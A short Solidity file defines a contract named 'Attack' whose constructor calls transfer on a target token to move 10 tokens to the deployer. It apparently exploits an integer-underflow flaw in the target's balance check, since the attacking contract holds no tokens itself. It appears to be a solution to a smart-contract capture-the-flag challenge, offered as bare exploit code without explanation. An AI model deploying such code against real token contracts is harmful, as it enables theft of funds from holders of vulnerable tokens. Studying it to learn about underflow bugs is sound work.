// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface Itoken {
  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address) external view returns (uint256);
}

contract Attack {
  constructor(address _target) {
    Itoken(_target).transfer(msg.sender, 10);
  }
}